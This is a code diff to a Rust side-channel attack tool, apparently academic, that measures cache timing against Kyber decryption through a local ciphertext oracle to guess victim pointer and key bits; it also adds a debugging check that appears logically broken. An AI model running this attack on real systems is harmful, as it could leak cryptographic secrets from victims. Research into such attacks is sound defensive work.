@@ -86,7 +86,7 @@ fn kyber_hacker(
     let mut global_pp_idx: usize = 0;
     let mut global_flush_group_idx = 0;
     let mut result_file = File::create("kyber.txt").unwrap();
-    let mut stats_file = File::create("kyber_accuracy.txt").unwrap();
+    // let mut stats_file = File::create("kyber_accuracy.txt").unwrap();
     let mut pp_idx = 0;
     let mut pointer_idx = 0;
     let mut poly_idx = 0;
@@ -465,10 +465,17 @@ fn kyber_hacker(
         threshold_leak = threshold_v.iter().sum::<u64>() / threshold_v.len() as u64;
         println!("[+] Leak Threshold: {}", threshold_leak);
 
-        let mut bad_flag = 0;
+        // instead of creating a ciphertext here, we rely on a smart process that will submit us
+        // with them, we just need to measure the timing, i.e. we are implementing an oracle here
+        let mut oracle_stream = TcpStream::connect("127.0.0.1:3334")?;
+        let oracle_repetitions = 5;
+
+        // Send random mask and masked pointer so that constructed ciphertext is decrypted into
+        // message containing victim pointer
+        stream.write_all(&rand_mask).unwrap();
+        stream.write_all(&target_addr).unwrap();
+
         group_search_flag = 1;
-        let mut global_guess_result = 100;
-        let mut repetition_times = 0;
 
         while pointer_idx < 4 {
             // shift the flush evset
@@ -567,7 +574,7 @@ fn kyber_hacker(
                     let mut guess_result: i16 = 0;
                     
                     let window_index: usize = KYBER_N as usize *poly_idx + pointer_idx * 64 + bit_idx;
-                    write!(stats_file, "bit:{} mode:{}\n", window_index, mode).unwrap();
+                    // write!(stats_file, "bit:{} mode:{}\n", window_index, mode).unwrap();
                     for guess_idx in 0..guess_idx_mask as usize {
                         let mut store_offset: usize = guess_idx;
                         let mut positive_flag = 0;
@@ -576,10 +583,10 @@ fn kyber_hacker(
                         for _ in 0..repetitions {
                             let test_case = times_to_load_test_ptr_atk[store_offset];
                             test_atk_tmp.push(test_case);
-                            write!(stats_file, "{} ", test_case).unwrap();
+                            // write!(stats_file, "{} ", test_case).unwrap();
                             store_offset += guess_idx_mask as usize;
                         }
-                        write!(stats_file, "\n").unwrap();
+                        // write!(stats_file, "\n").unwrap();
                         test_atk_tmp.sort();
                         let median_test = test_atk_tmp[(test_atk_tmp.len() / 2 - 1) as usize];
                         println!("get {}: {}", guess_idx, median_test);
@@ -698,6 +705,15 @@ fn main() {
     println!("[+] Target Pointer start frame -> {:#x}", victim_cl_start);
     println!("[+] Target Pointer end frame -> {:#x}", victim_cl_end);
     println!("[+] Number of trial for each coefficient -> {}", poll_times);
+
+    let first_pointer_offset = (victim_buf_offset as usize) & 0x3f80;
+    for pointer_idx in 1..4 {
+        let offset = (victim_buf_offset as usize + pointer_idx * size_of::<u64>()) & 0x3f80;
+        if first_pointer_offset != pointer_idx {
+            panic!("Full rotation checks are not going to work with given victim_buf_offset");
+        }
+    }
+    panic!("All good!");
 
     unsafe{ pin_cpu(4); }
 
